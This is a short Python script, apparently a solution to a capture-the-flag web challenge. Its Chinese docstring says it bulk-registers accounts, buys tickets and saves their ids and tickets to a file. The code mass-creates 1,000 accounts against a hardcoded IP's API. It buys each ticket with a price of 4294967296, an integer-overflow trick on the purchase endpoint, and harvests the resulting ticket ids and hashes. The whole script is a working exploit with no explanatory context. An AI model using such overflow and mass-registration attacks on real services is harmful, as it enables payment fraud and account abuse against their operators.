#!/usr/bin/python3
#cofing: utf8
"""
批量注册账号，购票，再把id和ticket放到result.txt中
"""
import requests
import urllib.request
import time

ticket_file = "result.txt"

buy_ticket = "http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"
pay_ticket = "http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="

def register(username):
	"""
	parm: username
	retn: user's cookie
	"""
	url = "http://117.51.147.155:5050/ctf/api/register?name=%s&password=12345678" % username
	response = requests.get(url)
	return response.headers["set-cookie"].replace("Path=/, ", "")

def get_user_ticket(cookie):
	"""
	parm: cookie
	retn: (id, ticket)
	"""
	headers = {"cookie":cookie}
	
	#buy ticket
	url = buy_ticket
	result = urllib.request.Request(url, headers = headers)
	result = urllib.request.urlopen(result).read().decode("ascii")
	time.sleep(1)
	
	#pay ticket
	bill_id = result[result.find('"bill_id":"') + len('"bill_id":"'):result.find('","ticket_price"')]
	url = pay_ticket + bill_id
	result = urllib.request.Request(url, headers = headers)
	urllib.request.urlopen(result)
	time.sleep(1)
	
	#get ticket hash and id
	url = "http://117.51.147.155:5050/ctf/api/search_ticket"
	result = urllib.request.Request(url, headers = headers)
	result = urllib.request.urlopen(result).read().decode("ascii")
	identity = result[result.find('"id":') + len('"id":'):result.find(',"ticket"')]
	ticket = result[result.find('"ticket":"') + len('"ticket":"'):result.find('"}],"msg"')]
	with open(ticket_file, 'a+') as result:
		result.write("%s | %s\n" % (identity, ticket))


for i in range(1000, 2000):
	cookie = register("leafbot%d" % i)
	time.sleep(1)
	
	get_user_ticket(cookie)
	time.sleep(1)
	print(i)



